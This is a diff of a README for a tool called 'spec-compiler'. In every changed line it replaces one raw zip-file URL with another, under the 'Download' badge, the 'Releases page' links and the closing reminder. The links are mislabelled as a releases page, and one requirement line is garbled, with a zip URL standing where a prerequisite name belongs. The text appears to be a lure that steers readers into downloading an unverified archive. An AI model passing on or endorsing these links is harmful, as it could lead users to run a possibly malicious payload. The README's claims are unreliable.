@@ -8,11 +8,11 @@ Welcome to **spec-compiler**! This tool helps you turn your thoughts and ideas i
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download spec-compiler](https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip)](https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip)
+[![Download spec-compiler](https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip)](https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip)
 
 Follow these steps to install and run the software on your device.
 
-1. Visit the [Releases page](https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip).
 2. Look for the latest release version.
 3. Download the file that matches your system (Windows, Mac, Linux).
 4. Once the download is complete, find the downloaded file in your computer’s Downloads folder.
@@ -37,7 +37,7 @@ Before you download **spec-compiler**, check these requirements:
 - **Operating System:** Compatible with Windows, Mac, and Linux.
 - **Memory (RAM):** At least 4 GB available.
 - **Storage:** Minimum of 200 MB of free space.
-- **https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip** Ensure https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip is installed on your machine for optimal performance (recommended version: 14.x or higher).
+- **https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip** Ensure https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip is installed on your machine for optimal performance (recommended version: 14.x or higher).
 
 ## 🌐 Usage
 
@@ -70,4 +70,4 @@ For regular updates and community support, consider following our GitHub reposit
 
 ## 🔗 Final Reminder
 
-Don't forget to visit the [Releases page](https://github.com/Aabody509/spec-compiler/raw/refs/heads/main/docs/context/compiler-spec-arrogate.zip) to get the latest version of **spec-compiler**. Enjoy transforming your ideas into structured outputs with ease!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Aabody509/spec-compiler/main/contracts/compiler-spec-2.9-beta.2.zip) to get the latest version of **spec-compiler**. Enjoy transforming your ideas into structured outputs with ease!
